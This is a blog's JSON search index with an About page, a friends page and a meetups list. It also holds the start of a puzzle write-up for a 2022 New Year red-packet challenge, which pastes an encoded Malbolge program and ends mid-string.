{"meta":{"title":"MiaoTony's小窝","subtitle":"喵喵喵~","description":"喵~欢迎各位大佬的来访呀！","author":"MiaoTony","url":"https://miaotony.xyz","root":"/"},"pages":[{"title":"404","text":"","path":"404.html"},{"title":"categories","text":"","path":"categories/index.html"},{"title":"about","text":"Blog 的前世今生根据 About 页面的生成时间，MiaoTony’s Blog 搭建于 2019 年 11 月 27 日晚上，首次部署于 28 日凌晨。 在此之前，尝试过微信公众号、CSDN 博客之类的，再之前的话自己也建过博客/论坛，不过由于年份久远基本就 404 或者找不到了 233。 微信公众号的话，主要没多少人关注，写文章也不方便，不能加外链，推送出去就不能随意修改，不加美化的话界面还丑丑的，于是渐渐就不怎么更新了。（其实本来也没发过几篇） CSDN 博客的话，平台上有很多大佬一起分享自己的经验和见解，个性推荐做的不错，阅读量稍微多了一点点点点，但每次发表文章都需要审核，修改的话也需要审核，图片也需要一张张上传……感觉不大方便吧。 说到建站的初衷嘛，考虑到偶尔会折腾点小玩意儿，而且折腾了老半天的东西很可能过了一段时间就不记得了，这时又得回去到处找资料，就觉得很烦但又很无奈。（摊手）于是就想找个地方记录一下。 另外，那时看到了 Milkice’s Icebox，觉得自己建博客挺有意思的，后面又看到了 A2OS 上一堆大佬的博客…… 基于以上种种原因，就想折腾一下，自己建一个博客吧。 正好那时候的前不久打了第一次 CTF，想把随手写的 WriteUp 发出来（这一篇）。后来有次来了兴趣，分析了一下QQ小程序【年终报告单/2019年终总结】，正好也需要一个比较方便记录的地方（也就是这一篇）。 懒+拖延了好久之后，MiaoTony’s Blog 终于逐渐搭建起来了！ 博客建着建着，感觉关于页面还缺点啥，但一直拖着没写…… 这次来补上了！ （20200318） TODO 完善 RSS 订阅 （RSS 链接：https://miaotony.xyz/atom.xml 修改模板，完善 About 页面 （就是这个页面了 写个 Blog Contents/Archives 项目部署到 GitHub 上 （在这里： BlogArchives 邮箱订阅，自动推送文章 （快戳 这里 来订阅喵~ Telegram Channel 推送 （不打算自动推了，还是自己发感觉更友好一点喵~ 整一个 面基 Meetups 页面 （嘿嘿，写好了，放在 /meetups 下了喵~ 友链页面上的链接随机排列 文章随机推荐 Timeline 20211216：升级了 Font-Awesome、tocbot、lightGallery 等一些插件的版本，合并了 Matery 主题的部分更新，优化了搜索框，修复了代码块复制时由于添加版权信息而导致代码空白字符消失的 bug 等。 20210205：将博客版本由 hexo 4.0.0 升级到了目前最新的 5.3.0，同时合并了 Matery 主题的大部分更新。（喵呜，前端更新换代真快） 20210128：给 About 页面加上了 Sponsorship，欢迎 buy me a cup of coffee~ 20201216：新增 面基 Meetups 页面，详见 /meetups。（又一个 TODO get√） 20200729：新增 邮箱订阅，基于 RSS 和 mailchimp 来实现。在这里 提交你的邮箱之后，有新文章就会自动给你的邮箱发邮件推送啦！（又一个 TODO get√） 20200411：由于 safari 不支持 .webp，改为用 tinypng 来压缩背景图片了。 20200410：压缩背景图片 并转换为 .webp 格式 ，优化加载速度。 20200320：折腾了一下，开发了一个博客文章归档的 项目 BlogArchives，基于 GitHub Action 定期通过 RSS 更新，生成文章列表。 （后续打算基于这个实现 Telegram Channel 推送呢！ 20200318：终于来完善 About 页面（就是这个页面）了。 20200314：让 JavaScript、CSS、一些背景图片走 jsdelivr 的 cdn，优化网站加载速度。 修改了 hexo 的 feed 插件，把 RSS 中的 summary 优化为了文章的摘要，改善了订阅体验。（RSS 地址：https://miaotony.xyz/atom.xml ） 20200207：升级 Gitalk 评论插件以解决 Email Bombs，详见这里。 20200123：加入一个网页 title 特效。 离开页面后标题显示为 返回页面提示 20200120：绑定了 miaotony.xyz 域名。 20191207：新增 Gitalk 评论系统。 20191206：更换为 Matery 主题。 201912XX：陆续搬运了之前写的几篇文章到博客上。 20191202：更换为 cube 主题。搬运了之前写的 CTF WriteUp 并进一步完善。 20191128：Hello World！本站初次搭建，基于 Hexo，部署在 GitHub Pages 上。用的是默认主题。 201907XX ：尝试在 CSDN 博客上发表文章。第一篇搬到这里了。 2018不记得什么时候：申请了一个微信公众号，随手推点东西。（不过真没啥东西） ContactGitHub: https://github.com/miaotony 欢迎来 follow 呀！ Telegram: Just PM @meow_portal_bot Telegram Channel: @MiaoTonyChannel Email: bWlhb3RvbnlAb3V0bG9vay5jb20= | b64decode 欢迎大佬们来和我交换友链呀~ 留言请移步到留言板，谢谢。 SponsorshipBuy me a cup of coffee~ WeChat: 爱发电 afdian: https://afdian.net/@miaotony Last Modified Time: 2021-12-16","path":"about/index.html"},{"title":"contact","text":"","path":"contact/index.html"},{"title":"friends","text":"本站信息名字： MiaoTony’s 小窝 链接： https://miaotony.xyz/ 头像： https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/medias/avatar.jpg banner： https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/medias/banner.jpg 简介： 仰望星空，脚踏实地，未来可期 欢迎各位大佬来交换友链呀~请大佬留下链接、头像、一句话简介、联系方式或者私戳我也行啦。当然也可以邮箱联系: bWlhb3RvbnlAb3V0bG9vay5jb20= (base64 懂的都懂 嘿嘿嘿 一点小要求 前提至少是我们认识8 （不认识的话和我 py 交流一下就好了喵 这边建议先加上本站友链喵~ 最好保证一下质量，至少能较长时间维护下去吧~ 还有，记得上 HTTPS 呢！","path":"friends/index.html"},{"title":"Meetups","text":"2020-11-15@ Nanjing Presidential Palace (during ISCAS ISRC Summer 2020 Summit Meeting) With Zenithal, Billchenchina, TechCiel, Hearn, ksyx, 𝓟𝓾𝓽𝓲𝓷𝓼𝓹𝓾𝓭𝓭𝓲𝓷𝓰 (Putinspudding) @ Suning (nearby), Nanjing With Zenithal, TechCiel, XYenon 2020-12-05@ NUAA, Nanjing With NBSwSweet With Milkice, Hearn 2020-12-06@ Shenzhen (during X-NUCA 2020) With NanoApe, Nohn 2020-12-17@ Chuji roast duck, Nanjing With Raphael Wired 2021-01-01@ Xinjiekou, Nanjing With Michael Zhu (Apoi), 𝓟𝓾𝓽𝓲𝓷𝓼𝓹𝓾𝓭𝓭𝓲𝓷𝓰 (Putinspudding), Hearn, XYenon 2021-02-23@ Ma′anshan With ksyx 2021-04-03@ Xinjiekou, Nanjing With Nohn, Milkice, 𝓟𝓾𝓽𝓲𝓷𝓼𝓹𝓾𝓭𝓭𝓲𝓷𝓰 (Putinspudding), Hearn, XYenon 2021-04-30@ Baijiahu, Nanjing With NanoApe, Milkice, Zinc Quartz, ZegWe 2021-05-03@ Xianlin, Nanjing With fruitymelon, Hearn, 𝓟𝓾𝓽𝓲𝓷𝓼𝓹𝓾𝓭𝓭𝓲𝓷𝓰 (Putinspudding) 2021-07-12@ Zhengzhou (during Qiangwangbei S5) With NanoApe, Papersnake, FantasqueX, dylanyryang, w00d, wulipulala 2021-07-25@ Guangzhou With batkiz, Nohn, 神楽坂 ゲイシャ (kgrzkgeisha) 2021-08-28@ Shanghai With EsonHugh_Skywalker 2021-09-11@ Shanghai With Seiry Yu, PMExtra, qrzbing, Milkice 2021-09-20@ Shanghai With Micheal (Abinitio_ren_xia_ren), Estela🍓 Xi, Michael Zhu, W A, Marcythm, ☄️ LightQuantum, fruitymelon 2021-10-05@ Shanghai With Alex Chi, luyanaa, TomQunChao 2021-11-21@ Shanghai With Methionine Lee, Aisina (LovelyWei) 2022-01-22@ Guangzhou With 神楽坂 ゲイシャ (@kgrzkgeisha), batkiz, 渡辺 広人, Alex Hsieh, Jeffery Young 2022-01-23@ Beijing Rd, Guangzhou With 莫斯奇多 (@hulotte) Meow~ To be continued…","path":"meetups/index.html"},{"title":"tags","text":"","path":"tags/index.html"}],"posts":[{"title":"CTF | 2022 GZTime's 元旦红包解谜 WriteUp","text":"引言时间总是过得那么快，这几周忙着各种期末 ddl，直到实验室年底聚餐了才意识到已经年末了。 转眼间 2022 年就到啦！ 新年第一篇，先祝大家新年快乐，新的一年里都能 flag 多多，都能有新的收获喵~ 跨年的时候听 GZTime 说准备了元旦解谜红包，于是就来瞄了一眼。 严格来说这应该不叫 CTF 吧，不过懒了，就姑且这么归类吧。 题目如下。 TimeAxis, [2022/1/1 1:41]这是一份元旦红包。虽然也就只有一些编解码的东西罢了.jpg有效期大约 2022-01-02 00:00 http://redpack.gz.wtf/2022.binAfter Base64:http://redpack.gz.wtf/2022.b64.txt 喵喵顺便丢了一份 binary 文件 在这里。 之后给出了一系列 hint。 TimeAxis, [2022/1/1 12:54]HINT 1: 最开始是个 deflate 压缩 TimeAxis, [2022/1/1 15:27]HINT 2: 第二层是个可以运行的程序，但并不是 binary（ TimeAxis, [2022/1/1 15:44]HINT 3: 以及有一次会用到 xor 加密 TimeAxis, [2022/1/1 18:08]HINT 4: malbolge TimeAxis, [2022/1/1 18:40]HINT 5: prod[]与后面是分离的 TimeAxis, [2022/1/1 19:44]HINT 6: 如果你得到了Key，你会知道一定是它的 步骤Step 1http://redpack.gz.wtf/2022.binAfter Base64:http://redpack.gz.wtf/2022.b64.txt 首先拿到一个 二进制文件，或者这个 base64 编码后的文件。 看了下用到了 deflate 压缩（后面 hint 也给了），inflate 一下。 得到的东西长这样…… D'`$#]\\~mlGjzhwfv3,+=`LLKm[Z(4EVfB@!a&gt;O_)([wvo5slTjihmfe+Lbg`ed]\\\"`_AWV[Tx;QPUNr5KPONGFjD,HAF?&gt;bBA@?&gt;7};:3W7wv4-,10)M-ml*)(!E%|#\"y?w|u;yxwYXtsl2pRhgle+Lbg`ed]\\\"`_^@\\Uy&lt;XQuUTSR43ImMLKDIHGF?cCB;:?&gt;7[|{92V05.R210)o-&amp;J*)('g%${Ay~w=^]sxqputml2poQmf,dLhgf_%cbDCY}]\\[T&lt;RvVUT6LpPIHMLEDhHAF?cCB;#?8\\&lt;|{321U5u-Q10po'&amp;+*#G'~%$#z@~}|utyxwp6tVlkpi/mfkd*hgfe^c\\\"`_A@Vz=SXWPOsMLKPImGFKJCHGF?c&amp;%A@9]7};4X87wv4-,10)M'm%$)(!E%$#\"!a}v&lt;zsrqp6Wmrqpih.lkjihg`&amp;d]E[!_^@?UTSw:VONMqQP2HlLEiCgGFE&gt;=aA@\"!=&lt;5Yz210T4ts1*No',%$)(!~D$dc!x}vu;srwp6WVl2johglkd*ba`_^]#a`_XW\\[ZYRvVU76LpP2NMLEiCBAFE&gt;bB;:?&gt;=6Z{9870Tu3,P0/.'m+$H(h&amp;%$#z@~}|{ts9wvuWmrqjoh.lkjc)gIedcb[!_X]\\UTxXWVO7SLpP2HMFKDhBAF?&gt;b%A@?&gt;7[;43W76v.3,P0/o-&amp;J*j(!~}C#\"bx&gt;|utyrq7oWslkjong-edchgfe^]#aC_^]\\Uy&lt;;WPUTSRQJn10LKJCBG@d&gt;=&lt;A:^!7&lt;5:3Wx05.-,+O/on,+*#Gh&amp;%${zy?}|u]yxwp6tVl2pRh.lNjchg`_%Fb[`YX|\\[ZYXWVUTSRQP2HMFEDhHAFE&gt;=a;@9&gt;7&lt;5Yz876/S-s10/.-&amp;J*)i!&amp;}${A!a`|u;yrwvo5slTpong-kMiha'Hdc\\\"`_X@\\Uy&lt;;WPUTSRKJOHl/KJIHAF?c=BA:?8\\&lt;|{321Uvu3,P0/.'&amp;J*)\"'~D$#\"!a}|u;yxwYun4rkjih.lNjihg`_%]ba`_^WVz=YRWPt76RQPONGkE-CgGF(D=aA@\"!7[|{98765.R2r*No-,+$Hi!&amp;}$#z@xw|uzyxwp6Wmrqpi/mlkjib(Ie^]\\\"`Y^W{[Z&lt;;WVOsSRQP2NGLEDhHG)(D=aA#9]7&lt;5Y9y1Uvu-,10/(L,%k#(!E%|dz@xw|uzyxwp6tVrkji/Ple+iKgf_%]\\a`_^]\\UTxXWP8NMLpJINMFEi,BGF?cCB$:^!7&lt;5:3276/S32+*)(L&amp;%*#(!~D$#\"yx}|u;\\[q7utsrqpi/glkdc)aI_dcb[Z~^@\\UTYRv9OTMLpPON0/EJCgA)?cCB$@98=&lt;;4X870v.32+O)(-,+*#G'&amp;%$dz@a}|{t:rwputml2ponglkd*hJ`edcb[Z~X]\\[Tx;:PONrLKPONGFj-CHG@?c&amp;BA:?&gt;76Z:9yx65.R2r0/('&amp;J*ji'~%|#\"y?`|{tsr8vuWmrqpingf,jiKgf_%cbD`Y}@?UZYRvVUT6LpP2NMLEiIBGFED=aA@\"!76;4X87w5.R2+q).'&amp;J*ji!&amp;}${Aba}v{t:xZpotm3kjih.Oedihg`&amp;G]\\a`_X|\\[Z&lt;;WPUTSRQJnN0/EJCgGFE&gt;&amp;&lt;`@?&gt;7};:3Wx05.3,P0/.-,%Ij('~%|#\"y?w_{zyr8putsrkj0hgfkjc)JI_d]\\\"ZY}WV[TSRWPtTS54JIHMFjD,BGF?&gt;bBA@?8\\&lt;|43W765u-Q10/o'Kl$)\"!E%$#\"!a}v&lt;]yxwpunsl2joh.lkjiKa'_G]#aC_^WVzZSRQu8TMRKPImMLEDIBf)E&gt;=B;_?&gt;~&lt;5Y987654321q)M-,+*ji!Ef${Aba}|{zyxwp6nsrk1Rhglkd*hgf_G]#aCBX]VUy&lt;;WPUTSRKJOHlLEDCBGF?cCB$@98=&lt;;4X81w/S3210)M-,+k)(!E%${z!x&gt;|{]\\xqpo5slTjihmfe+LKgf_%cbaZY}@\\[TSXWPt76LKJnNG/Ei,HGFED=a;:9&gt;7&lt;;:32V6v4-,P0).-,+$#G'~f${A!~w_u;yxwp6nslkj0nmledcbgf_%cbDZ_^WVz=SRWPtNMLQPOHlL.DIHGF?cCB$:^!=&lt;;:981U54-21*N.'m%$)('~D${c!x&gt;_^tyxqp6WVlqji/glejc)g`Hd]#a`_^@\\Uy&lt;XWPt7MLpPO1GFKDhHGF('C&lt;`@\"8=&lt;5Yzy10/S32+*).-&amp;J*)i!E%|{A!~w_utyxq7utVrkji/gOe+LKgf_%cba`BX]VUy&lt;XQuUTSR43ImMFKJCHAeE'&amp;&lt;`#9&gt;7&lt;;:981Uvu-,10/(L,%k#(!Ef${\"yx&gt;v{t:rZvun4Uqj0nmlkjc)gfHG]#D`Y^W\\Uy&lt;XWPt7SLQJn1MFEJCgA@d'CB;:9]7};:3W7wv432+O/.-&amp;J*ji!Efe#z@x}|{zyxwp6WVlqjoh.leMib(fHGcb[ZY}|\\[ZYR:PtNSLKJnN0/EJCg*F?cC%;:?8\\&lt;|432V6/u-Q10/.'&amp;+$)\"F&amp;%e{\"yx}|ut:xwputm3Tpihmf,jibJ`&amp;^F\\a`_X|\\[=YXWPOs65KPOHGk.JIHG@d'&amp;&lt;`@?!~&lt;5Y981w5.R2r*N.-,+k#(!E}${A!~}v{t:xZpunsl2pongOe+LKgf_%Fba`_^]VzT&lt;XWVOs65KPImML.DhHGFE'&amp;&lt;`:?&gt;76;:3Wx654-,P0).-,+$#G'~}${z@a}vuzs9Zvo5Vlqji/mle+LKafedcb[Z~^]\\[Z&lt;RvVONMRQPIm0/EJCgGFED=aA:9&gt;7[|{98765.R2+q).'&amp;J*ji'~%|#\"y?w_{zyr8vuWVrk1ohmf,jLha'e^Fb[Z_X|V&gt;ZSw:VUNMqQJONMLEDhBGFED=aA#9]~&lt;;:9876/S32r*N.-,%k)\"F&amp;%$d\"y?wv{tyr8vXWsrk1Rnmle+LKgf_%cbD`YXW\\UZSwW9OTSLKoONG/KDCBf@(&gt;=aA@?87[543W70T432r0)M-,lk)\"Fg%$#zy~w=^]yxqpo5mrkpohmlkd*hgf_Gcb[!_^@?[ZYRv9OTMRQPIm0/EDCBGF?cCB$#?8\\&lt;|{321U543sr*N.n,+*)\"F&amp;f${Ab~w|uzs9qvonm3kSong-kjc)gIHdcbaZ~^@?UZYRvVUT6LpP2NGkE-CHAF?cCB;#?8\\&lt;|{321U5u-Q+*/(-&amp;+*#(!E%${A!a}v&lt;]\\rqp6Wmrqpih.lNd*ha`e^cb[!YXW{[T&lt;RvP8TMRQPIHGkEJCBfF('C&lt;`#9&gt;7&lt;5Y9y10/S3,r*N.-&amp;%$#GF&amp;f|{\"y?`v{tyr8Yotml2pingfkjc)gfed]b[!_^@VUTxX:VOsSRKJn10FEiCgGFE'&amp;&lt;`:987[549870/St,+*/(L&amp;l$#(!Efe{zy?w_utyxq7onml2poQg-Njchgf_d]#DC_^WVzZSRQPOsS54PINGkKD,HAe(DCBA:^!~&lt;5Y981w543,P0/o-,%*)(!~D$#\"bx&gt;|{zs[q7uWsrkj0ngfkjib(f_Gcb[!B^WVzTx;QPUNr54JONGFEi,HG@d'&amp;&lt;`:\"8=&lt;54X87w5.-210/(L,%k#(!E%$#cbx&gt;|u]yxwp6WVlqjoh.ONjiha'edFEaZ~X@\\[TxXWP8NrLQPONGLEDhHGFE&gt;&amp;&lt;`@9&gt;=6Z:9y10/S32+q)M-&amp;+*#G'&amp;}|{z@~w_utyxq7otmrqji/mlejihg`&amp;dcbDZ_^WVzZSwQVUNMq4JIHMLEi,BAF?&gt;=aA#9]76;:9870/Sts+*)Mn&amp;+*#('~De#\"!x}|{t:xwvunml2Sihg-kdiba`&amp;G]\\a`_X|?UZSRvVU76LpJOHl/EDCBAeEDCBA#9]=6|49810/.R2r*N.n,%I)('g}C#c!~}v{t:[wvunml2johgle+LKgf_%F\\[`_^]VzT&lt;XWVOs65KPImMFKJCgG@?&gt;=a;_9&gt;=&lt;;:981Uv.32+O/.-ml$Hi'&amp;%$#z@x}v{tyxwvo5Vrqpi/g-kjibJ`&amp;G]baZY}]\\[ZYRWVUNrRQ3IHMLEiI+*F?&gt;b%A@9]=&lt;5:32V6/4-Q10/(L,+$#(!E%e#z@a}v{t:[wvonm3qpongOe+LKgf_%FE[!_X@\\[TxXWV8NrR43IHGkKDCgA)?&gt;C&lt;`@\"&gt;76Z:9yx65.R,10/(Lm%$#G'&amp;f|{\"y?`_{tyrwp6Wmrqpi/g-kMLhg`&amp;^]\\[!_^@?UTSw:VONMq4JIHMLEiIBGF?c=%;_?&gt;7&lt;543Wx05.R2+q/('&amp;J*#\"Fg%$#\"!x&gt;|ut:[Zvutmlkj0nPOkd*hJ`edcb[Z~^@\\UTxXWVU7Mq4JIHMLEiIH*)?&gt;=a;@?&gt;=6Z:9yx65.RQ10/.',%$#Gh~D$#\"!x}v&lt;z\\r8vutVlkj0QPfejc)gI_d]b[!_^@VzTSRQPtT6LQJIm0/KDCHAF?cCB$#?8\\&lt;|{321U5u321*No-,%$#G'g}${z!x&gt;|u]yxwp6WVrk1onPle+iKgf_%]\\a`_^]\\UTxXWP8NMLpJINMFEiI+*F?cCB$:^&gt;=&lt;|4Xy165.-Qrq/('&amp;Jk)\"!&amp;}Cd\"!x&gt;v{zyxwp6Wsrkji/mOedihg`&amp;Gc\\[`_X|\\[Z&lt;;WVUNMq4JIHMLEiCBGF?cC&lt;$@9]=6;4381U5u-Q10po'&amp;+*#Gh&amp;}|#\"y?}|utyxwp6tVrkj0hglkd*hg`Hd]#[ZY^W{[TYXQVUNrRQPO1Gk.JCHAFE&gt;bBA#9]=&lt;;:zy1U5432r*N.'m+$H('~%$#\"!x&gt;|{z\\r8vuWsrqpi/gOe+LKgf_%Fb[!_X@\\[TxR:PtNMRKPIm0/EJCg*)?&gt;=aA@\"!7[|:921U5u3,P0/o-,%*)(!~De{zy~w={z\\xwp6Wmrqpi/gfkjib(feG]\\[!B^WVzZ&lt;;WVOsSR43ImMLK-IBfF?&gt;C&lt;;_?!=6Z4981Uvu3,P0/o-,+$Hi'&amp;%$#z@?}|^]s9Zvotml2pohmf,Mib(f_Gcb[!B^WVzZSXQVOsSRKJOHMFjJC+G@?&gt;b%$:^&gt;7};:3Wx6/4-,P0po-&amp;%*#G'&amp;}|B\"yx}|ut:xwputm3Tjohmf,jcb(`H^$E[ZY}W\\[TSRvP8TSRQJnN0/EJCgA)E&gt;bB$@?&gt;=&lt;5Y9216543,Pq/.'&amp;%Ij('~%|#\"y?`|{tsr8vXtsl2piQmfkd*hgI_^]#aZ_XW{[=YXWPOsSLQJOHlFEDIHGF?c&amp;%A@9]=}5Yzy1054-,P0/(L&amp;l$#('&amp;}C#\"!a}v&lt;zsxwpunsl2poQg-Njiha`ed]#DCYXW{UTYXQPtNMq43Im0LKDhHGFE'&amp;&lt;`:\"8=&lt;54X87654321q)M-,+*ji!E%${\"y?&gt;|u]sxwp6tsrqpoQg-kjiKgf_%FEaZY^]Vz=YXQVUNrRQ3ONMFj-CBGFED=a;:?87[5{9810/St2+0).'Kl$)\"'~De#zyx&gt;_{zsrwvun4Uqj0nmlkjc)JI_dc\\[!B^WVUy&lt;XWPtT65KJOHMLEi,BGF?&gt;bB;#?8\\&lt;;:z870T4ts1*N.-,+k#G'~}${z@~wv{t:[Zpotsl2Sinmlkjiba'H^]\\[Z~^@VUTSXQVOsM5KJONGkE-CHAF?cCB;#?8\\&lt;|{92765.-Qrq/('&amp;Jk)('~D$dc!x}vu;srwp6tVlkpi/mfkd*hg`Hd]#a`_A]\\[TxXQVOs65KJImMFEDhH*)ED=aA:?&gt;76;:981U5432r*N.-m+$H\"!~}C#c!~}v{t:[wvonm3qjinmled*Kg`edcb[Z~^@\\Uy&lt;XWVOs65QPIHlLKDIBf)(DCB;_9&gt;=&lt;5Y9y10/S32+q/('&amp;J*#\"F&amp;fe#\"!~w={tsxqp6tsrqji/glejchgf_%cbDZ_^WVz=SRWPtNMLKPImGLEiIHGFE&gt;&amp;&lt;`#?&gt;76;:981U5.3,P0).'K+*ji'~%|#\"y?}vutsxqvun4rkSonmlkdihg`&amp;G]b[`_X|\\[T&lt;RvP8NSRQJImGFEiI+*@dDC&lt;;:?&gt;7[5{9270/S-2+O/.'m+*)(!E}$#\"!xwv&lt;zyxwputsl2pRQmf,dc)gIHdcb[!_^@?UZYRvVUT6Lp3OHMFKDhBAFE&gt;=aA@\"!=&lt;;:3W1w/Sts+*)M'&amp;%$)(!~}${A!xw=u]srqvo5slTpong-Njchgf_d]#DZ_^]VUTx;QPUNrLKPONGFj-CBGFED=a;:?&gt;7&lt;;4Xyx65.R2+q/.'&amp;%Ij('~%|#\"y?w_{zyr8von4Uqji/mONd*hgf_Gcb[!_^@VUTxXQ9OTSLKoOHGFKDhHA@E&gt;=&lt;A:^8=6;4X8xw5.R2r*N.n,%I)(!&amp;%|B\"yx&gt;_{zyxwvun4Uqji/gOejc)a`_%cbaZY}WVzZYRWVUTMqQPONMLEiIH*)?&gt;=aA@\"!7[|:921U5u3,P0/o-,%*)(!~De{zy~w=^]yrqpo5Vrqji/g-NMiha'e^Fba`Y^WVzTSwQ9UTMqQPIHGkEDIHGF?cCB$#?8\\&lt;|{321U54-s+Op.-&amp;+$)\"F&amp;f|#\"yx&gt;v^tyxwvon4Uqji/gOejc)gIe^]ba`Y}@\\[TSXWPt7SLQPImMFKJIHAF?c=&lt;A:?8\\&lt;|{321U5u-,10/(L,l*#G'g%${A!~`|u;yxwYun4rkjih.lNjihg`_%]ba`_^WVz=SRWPtNMLQPOHlLKJIBG@dDCB$:^&gt;=&lt;|4X87wv.R210/.'&amp;J$j('~D${z!x}v&lt;tyrwvutml2pohg-ejcba'H^]\\[Z~^@VUTSXQVOsSRQJONGkE-CHAF?c&amp;BA@?&gt;=&lt;5Y92x6/Sts1*No'Kl$)\"!E%$#\"!a}v&lt;]yxwvonm3kpohglkd*hJfed]#DCY^]\\UTxRQVUNr54JnN0/EJCgGFEDCBA#9]7&lt;;4X81w/S-s+O)o-&amp;J*)('g%${A!x}v{ts9wYun4rqji/mONdcha'ed]\\[Z~^@\\UTYRvVUNMRQJIm0/EJCg*F?D=BA@?8\\}54381U54t,1*)M'm+*)(!Efe{z!x&gt;|{tsxqp6tmrqji/mlkjibJ`&amp;dcbaZY}WVzTx;QVUNSLpJ2NMLKDhHGFE'&amp;&lt;`@?!~&lt;5Y32765.-Q+*/.'&amp;+$)\"F&amp;f|{\"y?}_{t:xqYo5Vrqjih.lNjiha`ed]#aCY^W\\[TxXQVUTSLpP2NMLEiIHAFE&gt;bBA#\"8=6Z4921Uvu3,P0p(L&amp;+$#G!g%|{\"y?}|u]yxwp6tVrqpoh.ledcbaf_%c\\aZYXW{&gt;=SRWPtT6LKJn1MLEDIBfFE'=a$@?&gt;=&lt;5Y981w54-,Pq).-&amp;%I#('~D$d\"!x}|ut:xwvuWmrqjoh.lejc)g`edc\\\"CY}W?UTSwWVUT6LpP2HMFEDIHAeEDCB$:^&gt;=&lt;|:3W70v.32+O)(-,+*#G!g}|#\"!x&gt;|^]sxqputml2pohmlkjc)g`Hd]\\aZ~X@\\[TxR:VOs65QPIHMLEiI+*@dDCB$#?8\\}|49810T4-,P*/(-&amp;+$Hi'&amp;%$#z@~w_{zyr8YXtmlk1Rhgfkjc)JI_d]\\\"ZB^]\\[TxXW9ONMLpP2NGLEi,BGF?&gt;b%$@987[Z4z270/S32r*N.'m+$H('gf|Bz!~wv&lt;zyxZpunsl2poQmfkdcba'_^cbaZ~A@\\[TSRvP8NSLQPImGFKJCHGF?cC%$:^&gt;7};:3Wx05.-2+0/(L,lk)(!E}|B\"!~}|{t:xqYo5srTSohgle+LKgf_%]b[!Y^]Vz=YRWPt7MRQJnH0LKDhHAF?c&amp;&lt;;@9]=&lt;|43W765u-Q+*/('&amp;+*#G'~}${z@xwv{t:xqvotm3qpohglkd*hg`Hd]#a`_A]\\[TxXQVUTSLpP2NMLEiCBAFE&gt;bBA#9]~}5:9810Tu3,Pq).'&amp;+$)(!E%edzy~w=utyrwvun4rTSong-kjchgfed]#D`_XW{UTSXWPtNMLKPImMLKDCgA@E&gt;=BA:^&gt;7};:3W7wv4-,10)M-,+*#('&amp;}Cdz@a}v{t:rwpo5mrqjing-ediba'Hdcb[!_X@\\[TxXWP8Nr54JIHMFjJI+*@d&gt;&amp;&lt;`@?&gt;7};:3Wx05432+Op(-,%$Hi'&amp;%$#z@x}v{tyxwvo5Vlkjongf,jihg`_%FE[`_X]VzT&lt;RvV8TSLKoO10FEi,BfFE&gt;CBA:^8=6;4X8165432+*No-,%$)\"!~De{zy?`_u;yxwp6nsrkj0QPfejc)gI_d]b[!YA]\\[TxXQVOs65QPIHGkKJI+G@d'&amp;&lt;`#\"&gt;7&lt;;43W705.3,P0p.-,%$H('g%${Aba}|{zyxwp6tVrqpoh.fedc)afedcb[!_^]\\U=Sw:POTMLpJ2NGkEJIHG@dD&amp;&lt;;@?&gt;76Z{9870T.3,+0/('K+k)\"F~}|{\"y~w={zy[Zvo5srqpoQgf,dcbgfe^]#aCY}]\\[T&lt;RQVOs65QPIHMLEiI+G@ED=&lt;`@98\\}|:9876/.R2r0)M'&amp;+$)\"F&amp;%ed\"y~w=^]yxwvun4rqSing-kjiKgfed]#[Z_^WVUTxRWVUTSLKo2NGLEDCgGF?'C&lt;`@?&gt;~654X87wv4-,10)M-&amp;%*#(!E}${\"yxwv&lt;zyxqpon4lkpohg-ejc)g`Hd]\\aZ~X]VUZSwQVUTMq4JOHlLEDIHAe?DCB;_?&gt;~&lt;;:3Wx0/S321*p(Lm%$)\"F~%|{\"y?}_utsxwpo5srkjih.lkjihJI_%cbD`Y^WVUyY;WPt7MRKJIHlFKDIHAe?'=B;:^87&lt;;432V6vu3,Pqp(',+*#G!~%$#zy?w_{zyr8ponsrqj0Qgfkjib(`Hdc\\[`Y}@\\[TxXWPOs65QJnHlLE-CHAF?c=&lt;;@?&gt;=6Z498765.R21q/('K+*ji!&amp;}${A@awvuzyxq7uWmrqpi/gfed*bJ`ed]b[!_A@\\UySXWPt7MLQJOHlLEJIBAe?DCB;_\"876Z:z8165.-Q10/(-&amp;Jk)\"!&amp;}C#zb~w|{t:rwpun4Uqjohg-kdcba'e^Fb[!BXW{[Z&lt;;QVONMq4PONGLEDhHGF?'C&lt;`@\"8=6;:3W7654321*p(Lm%*#\"F~%|{\"y?w_{zyxwp6nslkj0nmlkjihJI_%cbDCYX]VzTYXQuUNSLKoOHGkK-,Bf@(D=&lt;`@\"!=&lt;;:981U5ut,P*p(L,%$#(!E%$d\"y?}vutyrqp6tsrTpoh.Okdibgf_%FE[ZY^]VUySXQPOs65KJOHMLEiI+*FE&gt;=aA#\"&gt;=65Y9816/4-,P0/.-m+$H(!~}C{\"yx&gt;|{ts9wvotsl2poQgf,dcbgfe^]#DZYX|V[ZSXQu87SLKoONMFj-CBG@dDCBA#\"&gt;765Yz870T4t,10)M-,+*)i!E%|#\"y~w={tsr8potsrkj0Qgfkjib(I_d]\\\"`B^WVUyYXWPOs65KJImG/EiIBGFE&gt;=&lt;`@?&gt;=&lt;|{92Vwv4-,+O/.'m+$Hi'&amp;}|#\"!x&gt;_{zyr8YXtmlk1iQmfed*bJ`ed]b[!BX]\\UTx;:PONrRQ3IHGLEiIHAF?c&amp;%A:98\\}|49810T4-s+O/.nm+$H\"!~}C{z!x}|u;yxwpo5srqpoQgf,dcbgfe^]#DZYX|\\&gt;ZSRQu8NSRKJOHl/.DhBG@dDCBA#\"&gt;765Yz870T4321qp('K%$)('~De{z!x&gt;|^]srwvun4lTji/POkdibgf_%cba`BXW{UTYXWPOs65KPONMFEiIB*@dD&amp;BA:^&gt;7&lt;;4Xy70Tu321*N.-&amp;%$)\"F&amp;%edzy~w=utsxwvun4Ukji/mfkdcb(`Hd]\\aZ~^]?&gt;ZYXQuOTSLpP2NMFKJCBf@E&gt;=&lt;`#\"&gt;=&lt;5Y3W16543,P0p.-&amp;J$#\"'~De#\"!~w={zy[Zvo5srqpoQgf,dcbgfe^]#a`BA]\\UyYR:VOs6LQJONMFjJCHGF?cC&lt;A@9]=}|:9876/St2+*/.'K+*)i!~Ded\"y~w=^]yxwvun4rqSing-kdLha'eGcba`Y}@V[TSw:POsMRKPImM/.JCBG@dD&amp;BA:^&gt;7&lt;;4Xy70T43,r*N.-,+k#(!E%edzy~}|u;yxwYutm3qjoh.fNdc)gfHG]#DZ_XW{[ZYRWVONrRKPONGkKJC+AF?cC